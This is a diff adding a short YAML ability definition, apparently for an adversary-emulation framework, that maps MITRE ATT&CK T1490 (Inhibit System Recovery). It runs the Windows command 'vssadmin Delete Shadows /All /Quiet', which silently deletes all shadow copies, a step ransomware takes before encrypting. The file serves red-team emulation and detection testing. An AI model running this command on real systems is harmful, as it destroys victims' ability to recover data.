@@ -1,0 +1,30 @@
+- technique_id: T1490
+  privilege: ''
+  buckets: []
+  delete_payload: true
+  description: Generated from SCYTHE
+  technique_name: T1490
+  additional_info:
+    cleanup: '[]'
+  repeatable: false
+  executors:
+    - payloads: []
+      code:
+      variations: []
+      command: vssadmin Delete Shadows /All /Quiet
+      additional_info: {}
+      build_target:
+      uploads: []
+      parsers: []
+      timeout: 60
+      cleanup: []
+      platform: windows
+      language:
+      name: cmd
+  requirements: []
+  plugin: ''
+  singleton: true
+  access: {}
+  name: impact 10
+  tactic: impact
+  id: e545daf3-dc85-4010-963a-b56921ecaab4
